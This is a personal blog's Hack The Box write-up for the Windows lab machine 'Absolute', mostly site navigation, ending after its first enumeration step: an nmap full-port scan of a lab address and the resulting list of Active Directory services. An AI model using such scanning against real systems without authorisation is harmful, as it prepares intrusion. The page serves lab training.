@@ -1,0 +1,427 @@
+<!doctype html><html lang=en><head><title>[HTB] Machine: Absolute</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=x-ua-compatible content="ie=edge"><link rel=stylesheet href=/application.650f674fc19266f4ea6c7b54bb6a4ffad10dfa641e3bea6de0a8472a99807590.css integrity="sha256-ZQ9nT8GSZvTqbHtUu2pP+tEN+mQeO+pt4KhHKpmAdZA="><link rel=icon type=image/png href=/images/logo_hub369d6c5ab3ad73350236cbc9a72876b_254257_42x0_resize_box_3.png><meta property="og:title" content="[HTB] Machine: Absolute"><meta property="og:description" content="[HTB] Machine: Absolute"><meta property="og:type" content="article"><meta property="og:url" content="https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/absolute/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-10-04T00:00:00+00:00"><meta property="article:modified_time" content="2023-10-04T00:00:00+00:00"><meta name=description content="[HTB] Machine: Absolute"></head><body class="type-posts kind-page" data-spy=scroll data-target=#TableOfContents data-offset=80><div class="container-fluid bg-dimmed wrapper"><nav class="navbar navbar-expand-xl top-navbar final-navbar shadow"><div class=container><button class="navbar-toggler navbar-light" id=sidebar-toggler type=button>
+<span class=navbar-toggler-icon></span></button>
+<a class=navbar-brand href=/><img src=/images/logo_hub369d6c5ab3ad73350236cbc9a72876b_254257_42x0_resize_box_3.png alt=Logo>
+Personal Blog</a>
+<button class="navbar-toggler navbar-light" id=toc-toggler type=button>
+<span class=navbar-toggler-icon></span></button><div class="collapse navbar-collapse lang-selector" id=top-nav-items><ul class="navbar-nav ml-auto"><li class="nav-item dropdown"><a class="nav-link dropdown-toggle" href=# id=themeSelector role=button data-toggle=dropdown aria-haspopup=true aria-expanded=false><img id=navbar-theme-icon-svg src=/icons/moon-svgrepo-com.svg width=20 alt="Dark Theme"></a><div id=themeMenu class="dropdown-menu dropdown-menu-icons-only" aria-labelledby=themeSelector><a class="dropdown-item nav-link" href=# data-scheme=light><img class=menu-icon-center src=/icons/sun-svgrepo-com.svg width=20 alt="Light Theme"></a>
+<a class="dropdown-item nav-link" href=# data-scheme=dark><img class=menu-icon-center src=/icons/moon-svgrepo-com.svg width=20 alt="Dark Theme"></a>
+<a class="dropdown-item nav-link" href=# data-scheme=system><img class=menu-icon-center src=/icons/computer-svgrepo-com.svg width=20 alt="System Theme"></a></div></li></ul></div></div><img src=/images/logo_hub369d6c5ab3ad73350236cbc9a72876b_254257_42x0_resize_box_3.png class=d-none id=main-logo alt=Logo>
+<img src=/images/logo_hub369d6c5ab3ad73350236cbc9a72876b_254257_42x0_resize_box_3.png class=d-none id=inverted-logo alt="Inverted Logo"></nav><section class=sidebar-section id=sidebar-section><div class=sidebar-holder><div class=sidebar id=sidebar><form class=mx-auto method=get action=/search><input type=text name=keyword placeholder=Search data-search id=search-box></form><div class=sidebar-tree><ul class=tree id=tree><li id=list-heading><a href=/posts/ data-filter=all>Posts</a></li><div class=subtree><li><i class="fas fa-minus-circle"></i><a class=active href=/posts/cybersecurity/>Cybersecurity</a><ul class=active><li><i class="fas fa-plus-circle"></i><a href=/posts/cybersecurity/guided-hacking/>Guided Hacking</a><ul><li><a href=/posts/cybersecurity/guided-hacking/dll-injector/ title="[Guided Hacking] DLL Injector">[Guided Hacking] DLL Injector</a></li><li><a href=/posts/cybersecurity/guided-hacking/external-trainer/ title="[Guided Hacking] External Trainer">[Guided Hacking] External Trainer</a></li><li><a href=/posts/cybersecurity/guided-hacking/internal-trainer/ title="[Guided Hacking] Internal Trainer">[Guided Hacking] Internal Trainer</a></li><li><a href=/posts/cybersecurity/guided-hacking/overview/ title="[Guided Hacking] Overview">[Guided Hacking] Overview</a></li><li><a href=/posts/cybersecurity/guided-hacking/shellcode-injector/ title="[Guided Hacking] Shellcode Injector">[Guided Hacking] Shellcode Injector</a></li></ul></li><li><i class="fas fa-minus-circle"></i><a class=active href=/posts/cybersecurity/hackthebox/>Hackthebox</a><ul class=active><li><a href=/posts/cybersecurity/hackthebox/challenges/ title="[HTB] Challenges">[HTB] Challenges</a></li><li><i class="fas fa-minus-circle"></i><a class=active href=/posts/cybersecurity/hackthebox/machines/>[HTB] Machines</a><ul class=active><li><i class="fas fa-plus-circle"></i><a href=/posts/cybersecurity/hackthebox/machines/linux/>[HTB] Linux Machines</a><ul><li><a href=/posts/cybersecurity/hackthebox/machines/linux/academy/ title="[HTB] Machine: Academy">[HTB] Machine: Academy</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/admirer/ title="[HTB] Machine: Admirer">[HTB] Machine: Admirer</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/agile/ title="[HTB] Machine: Agile">[HTB] Machine: Agile</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/antique/ title="[HTB] Machine: Antique">[HTB] Machine: Antique</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/armageddon/ title="[HTB] Machine: Armageddon">[HTB] Machine: Armageddon</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/backdoor/ title="[HTB] Machine: Backdoor">[HTB] Machine: Backdoor</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/bagel/ title="[HTB] Machine: Bagel">[HTB] Machine: Bagel</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/bank/ title="[HTB] Machine: Bank">[HTB] Machine: Bank</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/bashed/ title="[HTB] Machine: Bashed">[HTB] Machine: Bashed</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/beep/ title="[HTB] Machine: Beep">[HTB] Machine: Beep</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/blocky/ title="[HTB] Machine: Blocky">[HTB] Machine: Blocky</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/blunder/ title="[HTB] Machine: Blunder">[HTB] Machine: Blunder</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/bolt/ title="[HTB] Machine: Bolt">[HTB] Machine: Bolt</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/bountyhunter/ title="[HTB] Machine: BountyHunter">[HTB] Machine: BountyHunter</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/busqueda/ title="[HTB] Machine: Busqueda">[HTB] Machine: Busqueda</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/cap/ title="[HTB] Machine: Cap">[HTB] Machine: Cap</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/cronos/ title="[HTB] Machine: Cronos">[HTB] Machine: Cronos</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/curling/ title="[HTB] Machine: Curling">[HTB] Machine: Curling</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/delivery/ title="[HTB] Machine: Delivery">[HTB] Machine: Delivery</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/doctor/ title="[HTB] Machine: Doctor">[HTB] Machine: Doctor</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/explore/ title="[HTB] Machine: Explore">[HTB] Machine: Explore</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/friendzone/ title="[HTB] Machine: FriendZone">[HTB] Machine: FriendZone</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/frolic/ title="[HTB] Machine: Frolic">[HTB] Machine: Frolic</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/fulcrum/ title="[HTB] Machine: Fulcrum">[HTB] Machine: Fulcrum</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/goodgames/ title="[HTB] Machine: GoodGames">[HTB] Machine: GoodGames</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/haircut/ title="[HTB] Machine: Haircut">[HTB] Machine: Haircut</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/haystack/ title="[HTB] Machine: Haystack">[HTB] Machine: Haystack</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/help/ title="[HTB] Machine: Help">[HTB] Machine: Help</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/horizontall/ title="[HTB] Machine: Horizontall">[HTB] Machine: Horizontall</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/inject/ title="[HTB] Machine: Inject">[HTB] Machine: Inject</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/irked/ title="[HTB] Machine: Irked">[HTB] Machine: Irked</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/jupiter/ title="[HTB] Machine: Jupiter">[HTB] Machine: Jupiter</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/knife/ title="[HTB] Machine: Knife">[HTB] Machine: Knife</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/laboratory/ title="[HTB] Machine: Laboratory">[HTB] Machine: Laboratory</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/lacasadepapel/ title="[HTB] Machine: LaCasaDePapel">[HTB] Machine: LaCasaDePapel</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/lame/ title="[HTB] Machine: Lame">[HTB] Machine: Lame</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/late/ title="[HTB] Machine: Late">[HTB] Machine: Late</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/lazy/ title="[HTB] Machine: Lazy">[HTB] Machine: Lazy</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/luanne/ title="[HTB] Machine: Luanne">[HTB] Machine: Luanne</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/luke/ title="[HTB] Machine: Luke">[HTB] Machine: Luke</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/metatwo/ title="[HTB] Machine: MetaTwo">[HTB] Machine: MetaTwo</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/mirai/ title="[HTB] Machine: Mirai">[HTB] Machine: Mirai</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/monitorstwo/ title="[HTB] Machine: MonitorsTwo">[HTB] Machine: MonitorsTwo</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/networked/ title="[HTB] Machine: Networked">[HTB] Machine: Networked</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/nibbles/ title="[HTB] Machine: Nibbles">[HTB] Machine: Nibbles</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/nodeblog/ title="[HTB] Machine: NodeBlog">[HTB] Machine: NodeBlog</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/nunchucks/ title="[HTB] Machine: Nunchucks">[HTB] Machine: Nunchucks</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/october/ title="[HTB] Machine: October">[HTB] Machine: October</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/onlyforyou/ title="[HTB] Machine: OnlyForYou">[HTB] Machine: OnlyForYou</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/openadmin/ title="[HTB] Machine: OpenAdmin">[HTB] Machine: OpenAdmin</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/opensource/ title="[HTB] Machine: OpenSource">[HTB] Machine: OpenSource</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/pandora/ title="[HTB] Machine: Pandora">[HTB] Machine: Pandora</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/paper/ title="[HTB] Machine: Paper">[HTB] Machine: Paper</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/photobomb/ title="[HTB] Machine: Photobomb">[HTB] Machine: Photobomb</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/popcorn/ title="[HTB] Machine: Popcorn">[HTB] Machine: Popcorn</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/postman/ title="[HTB] Machine: Postman">[HTB] Machine: Postman</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/precious/ title="[HTB] Machine: Precious">[HTB] Machine: Precious</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/previse/ title="[HTB] Machine: Previse">[HTB] Machine: Previse</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/redpanda/ title="[HTB] Machine: RedPanda">[HTB] Machine: RedPanda</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/routerspace/ title="[HTB] Machine: RouterSpace">[HTB] Machine: RouterSpace</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/safe/ title="[HTB] Machine: Safe">[HTB] Machine: Safe</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/scriptkiddie/ title="[HTB] Machine: ScriptKiddie">[HTB] Machine: ScriptKiddie</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/secret/ title="[HTB] Machine: Secret">[HTB] Machine: Secret</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/sense/ title="[HTB] Machine: Sense">[HTB] Machine: Sense</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/shocker/ title="[HTB] Machine: Shocker">[HTB] Machine: Shocker</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/shoppy/ title="[HTB] Machine: Shoppy">[HTB] Machine: Shoppy</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/sneaky/ title="[HTB] Machine: Sneaky">[HTB] Machine: Sneaky</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/soccer/ title="[HTB] Machine: Soccer">[HTB] Machine: Soccer</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/socket/ title="[HTB] Machine: Socket">[HTB] Machine: Socket</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/spectra/ title="[HTB] Machine: Spectra">[HTB] Machine: Spectra</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/squashed/ title="[HTB] Machine: Squashed">[HTB] Machine: Squashed</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/steamcloud/ title="[HTB] Machine: SteamCloud">[HTB] Machine: SteamCloud</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/stocker/ title="[HTB] Machine: Stocker">[HTB] Machine: Stocker</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/sunday/ title="[HTB] Machine: Sunday">[HTB] Machine: Sunday</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/swagshop/ title="[HTB] Machine: SwagShop">[HTB] Machine: SwagShop</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/tabby/ title="[HTB] Machine: Tabby">[HTB] Machine: Tabby</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/teacher/ title="[HTB] Machine: Teacher">[HTB] Machine: Teacher</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/tentacle/ title="[HTB] Machine: Tentacle">[HTB] Machine: Tentacle</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/tenten/ title="[HTB] Machine: Tenten">[HTB] Machine: Tenten</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/traceback/ title="[HTB] Machine: Traceback">[HTB] Machine: Traceback</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/traverxec/ title="[HTB] Machine: Traverxec">[HTB] Machine: Traverxec</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/trick/ title="[HTB] Machine: Trick">[HTB] Machine: Trick</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/twomillion/ title="[HTB] Machine: TwoMillion">[HTB] Machine: TwoMillion</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/valentine/ title="[HTB] Machine: Valentine">[HTB] Machine: Valentine</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/validation/ title="[HTB] Machine: Validation">[HTB] Machine: Validation</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/writeup/ title="[HTB] Machine: Writeup">[HTB] Machine: Writeup</a></li></ul></li><li><i class="fas fa-minus-circle"></i><a class=active href=/posts/cybersecurity/hackthebox/machines/windows/>[HTB] Windows Machines</a><ul class=active><li><a class=active href=/posts/cybersecurity/hackthebox/machines/windows/absolute/ title="[HTB] Machine: Absolute">[HTB] Machine: Absolute</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/access/ title="[HTB] Machine: Access">[HTB] Machine: Access</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/active/ title="[HTB] Machine: Active">[HTB] Machine: Active</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/acute/ title="[HTB] Machine: Acute">[HTB] Machine: Acute</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/anubis/ title="[HTB] Machine: Anubis">[HTB] Machine: Anubis</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/apt/ title="[HTB] Machine: APT">[HTB] Machine: APT</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/arctic/ title="[HTB] Machine: Arctic">[HTB] Machine: Arctic</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/atom/ title="[HTB] Machine: Atom">[HTB] Machine: Atom</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/bankrobber/ title="[HTB] Machine: BankRobber">[HTB] Machine: BankRobber</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/bart/ title="[HTB] Machine: Bart">[HTB] Machine: Bart</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/bastard/ title="[HTB] Machine: Bastard">[HTB] Machine: Bastard</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/bastion/ title="[HTB] Machine: Bastion">[HTB] Machine: Bastion</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/blackfield/ title="[HTB] Machine: Blackfield">[HTB] Machine: Blackfield</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/blue/ title="[HTB] Machine: Blue">[HTB] Machine: Blue</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/bounty/ title="[HTB] Machine: Bounty">[HTB] Machine: Bounty</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/breadcrumbs/ title="[HTB] Machine: Breadcrumps">[HTB] Machine: Breadcrumps</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/buff/ title="[HTB] Machine: Buff">[HTB] Machine: Buff</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/cascade/ title="[HTB] Machine: Cascade">[HTB] Machine: Cascade</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/cerberus/ title="[HTB] Machine: Cerberus">[HTB] Machine: Cerberus</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/chatterbox/ title="[HTB] Machine: Chatterbox">[HTB] Machine: Chatterbox</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/conceal/ title="[HTB] Machine: Conceal">[HTB] Machine: Conceal</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/control/ title="[HTB] Machine: Control">[HTB] Machine: Control</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/devel/ title="[HTB] Machine: Devel">[HTB] Machine: Devel</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/driver/ title="[HTB] Machine: Driver">[HTB] Machine: Driver</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/dropzone/ title="[HTB] Machine: Dropzone">[HTB] Machine: Dropzone</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/escape/ title="[HTB] Machine: Escape">[HTB] Machine: Escape</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/flight/ title="[HTB] Machine: Flight">[HTB] Machine: Flight</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/forest/ title="[HTB] Machine: Forest">[HTB] Machine: Forest</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/fuse/ title="[HTB] Machine: Fuse">[HTB] Machine: Fuse</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/giddy/ title="[HTB] Machine: Giddy">[HTB] Machine: Giddy</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/grandpa/ title="[HTB] Machine: Grandpa">[HTB] Machine: Grandpa</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/granny/ title="[HTB] Machine: Granny">[HTB] Machine: Granny</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/hathor/ title="[HTB] Machine: Hathor">[HTB] Machine: Hathor</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/heist/ title="[HTB] Machine: Heist">[HTB] Machine: Heist</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/intelligence/ title="[HTB] Machine: Intelligence">[HTB] Machine: Intelligence</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/jeeves/ title="[HTB] Machine: Jeeves">[HTB] Machine: Jeeves</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/jerry/ title="[HTB] Machine: Jerry">[HTB] Machine: Jerry</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/json/ title="[HTB] Machine: Json">[HTB] Machine: Json</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/legacy/ title="[HTB] Machine: Legacy">[HTB] Machine: Legacy</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/love/ title="[HTB] Machine: Love">[HTB] Machine: Love</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/mantis/ title="[HTB] Machine: Mantis">[HTB] Machine: Mantis</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/minion/ title="[HTB] Machine: Minion">[HTB] Machine: Minion</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/monteverde/ title="[HTB] Machine: Monteverde">[HTB] Machine: Monteverde</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/nest/ title="[HTB] Machine: Nest">[HTB] Machine: Nest</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/netmon/ title="[HTB] Machine: Netmon">[HTB] Machine: Netmon</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/object/ title="[HTB] Machine: Object">[HTB] Machine: Object</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/omni/ title="[HTB] Machine: Omni">[HTB] Machine: Omni</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/optimum/ title="[HTB] Machine: Optimum">[HTB] Machine: Optimum</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/outdated/ title="[HTB] Machine: Outdated">[HTB] Machine: Outdated</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/pivotapi/ title="[HTB] Machine: PivotAPI">[HTB] Machine: PivotAPI</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/querier/ title="[HTB] Machine: Querier">[HTB] Machine: Querier</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/rabbit/ title="[HTB] Machine: Rabbit">[HTB] Machine: Rabbit</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/reel/ title="[HTB] Machine: Reel">[HTB] Machine: Reel</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/reel2/ title="[HTB] Machine: Reel2">[HTB] Machine: Reel2</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/remote/ title="[HTB] Machine: Remote">[HTB] Machine: Remote</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/resolute/ title="[HTB] Machine: Resolute">[HTB] Machine: Resolute</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/return/ title="[HTB] Machine: Return">[HTB] Machine: Return</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/sauna/ title="[HTB] Machine: Sauna">[HTB] Machine: Sauna</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/scrambled/ title="[HTB] Machine: Scrambled">[HTB] Machine: Scrambled</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/search/ title="[HTB] Machine: Search">[HTB] Machine: Search</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/secnotes/ title="[HTB] Machine: SecNotes">[HTB] Machine: SecNotes</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/servmon/ title="[HTB] Machine: Servmon">[HTB] Machine: Servmon</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/sharp/ title="[HTB] Machine: Sharp">[HTB] Machine: Sharp</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/silo/ title="[HTB] Machine: Silo">[HTB] Machine: Silo</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/sizzle/ title="[HTB] Machine: Sizzle">[HTB] Machine: Sizzle</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/sniper/ title="[HTB] Machine: Sniper">[HTB] Machine: Sniper</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/streamio/ title="[HTB] Machine: StreamIO">[HTB] Machine: StreamIO</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/support/ title="[HTB] Machine: Support">[HTB] Machine: Support</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/tally/ title="[HTB] Machine: Tally">[HTB] Machine: Tally</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/timelapse/ title="[HTB] Machine: Timelapse">[HTB] Machine: Timelapse</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/toolbox/ title="[HTB] Machine: Toolbox">[HTB] Machine: Toolbox</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/worker/ title="[HTB] Machine: Worker">[HTB] Machine: Worker</a></li></ul></li></ul></li><li><a href=/posts/cybersecurity/hackthebox/overview/ title="[HTB] Overview">[HTB] Overview</a></li></ul></li><li><i class="fas fa-plus-circle"></i><a href=/posts/cybersecurity/pentesting/>Pentesting</a><ul><li><a href=/posts/cybersecurity/pentesting/active_directory/ title="[Pentesting] Active Directory">[Pentesting] Active Directory</a></li><li><a href=/posts/cybersecurity/pentesting/attacking_services/ title="[Pentesting] Attacking Services">[Pentesting] Attacking Services</a></li><li><a href=/posts/cybersecurity/pentesting/file_transfers/ title="[Pentesting] File Transfers">[Pentesting] File Transfers</a></li><li><a href=/posts/cybersecurity/pentesting/footprinting_and_enumeration/ title="[Pentesting] Footprinting and Enumeration">[Pentesting] Footprinting and Enumeration</a></li><li><a href=/posts/cybersecurity/pentesting/linux_privilege_escalation/ title="[Pentesting] Linux Privilege Escalation">[Pentesting] Linux Privilege Escalation</a></li><li><a href=/posts/cybersecurity/pentesting/mobile_pentesting/ title="[Pentesting] Mobile Pentesting">[Pentesting] Mobile Pentesting</a></li><li><a href=/posts/cybersecurity/pentesting/network_pentesting/ title="[Pentesting] Network Pentesting">[Pentesting] Network Pentesting</a></li><li><a href=/posts/cybersecurity/pentesting/osint/ title="[Pentesting] OSINT">[Pentesting] OSINT</a></li><li><a href=/posts/cybersecurity/pentesting/pivoting_tunneling_and_port_forwarding/ title="[Pentesting] Pivoting, Tunneling and Port Forwarding">[Pentesting] Pivoting, Tunneling and Port Forwarding</a></li><li><a href=/posts/cybersecurity/pentesting/shells_and_payloads/ title="[Pentesting] Shells and Payloads">[Pentesting] Shells and Payloads</a></li><li><a href=/posts/cybersecurity/pentesting/web_attacks/ title="[Pentesting] Web Attacks">[Pentesting] Web Attacks</a></li><li><a href=/posts/cybersecurity/pentesting/windows_privilege_escalation/ title="[Pentesting] Windows Privilege Escalation">[Pentesting] Windows Privilege Escalation</a></li></ul></li><li><i class="fas fa-plus-circle"></i><a href=/posts/cybersecurity/pwn.college/>pwn.college</a><ul><li><a href=/posts/cybersecurity/pwn.college/overview/ title="[pwn.college] Overview">[pwn.college] Overview</a></li></ul></li></ul></li><li><i class="fas fa-plus-circle"></i><a href=/posts/projects/>Projects</a><ul><li><a href=/posts/projects/ums/ title="[Projects] User-mode Scheduling (UMS)">[Projects] User-mode Scheduling (UMS)</a></li></ul></li></div></ul></div></div></div></section><section class=content-section id=content-section><div class=content><div class="container p-0 read-area"><div class="hero-area col-sm-12" id=hero-area style=background-image:url(/posts/cybersecurity/hackthebox/machines/windows/absolute/images/absolute.png)></div><div class=page-content><div class="author-profile ml-auto align-self-lg-center"><img class=rounded-circle src=/images/logo_hub369d6c5ab3ad73350236cbc9a72876b_254257_120x120_fit_box_3.png alt="Author Image"><h5 class=author-name>Bektur Umarbaev</h5><p>Wednesday, October 4, 2023</p></div><div class=title><h1>[HTB] Machine: Absolute</h1></div><div class=taxonomy-terms><ul style=padding-left:0><li class=rounded><a href=/tags/htb/ class="btn, btn-sm">HTB</a></li></ul></div><div class=post-content id=post-content><h1 id=absolute>Absolute</h1><h2 id=enumeration>Enumeration</h2><ul><li><code>nmap</code></li></ul><pre tabindex=0><code>└─$ nmap -Pn -p- 10.10.11.181 --min-rate 10000
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-03 19:44 BST
+Nmap scan report for 10.10.11.181 (10.10.11.181)
+Host is up (0.10s latency).
+Not shown: 65509 closed ports
+PORT      STATE SERVICE
+53/tcp    open  domain
+80/tcp    open  http
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+47001/tcp open  winrm
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49673/tcp open  unknown
+49674/tcp open  unknown
+49675/tcp open  unknown
+49686/tcp open  unknown
+49692/tcp open  unknown
+49699/tcp open  unknown
+49703/tcp open  unknown
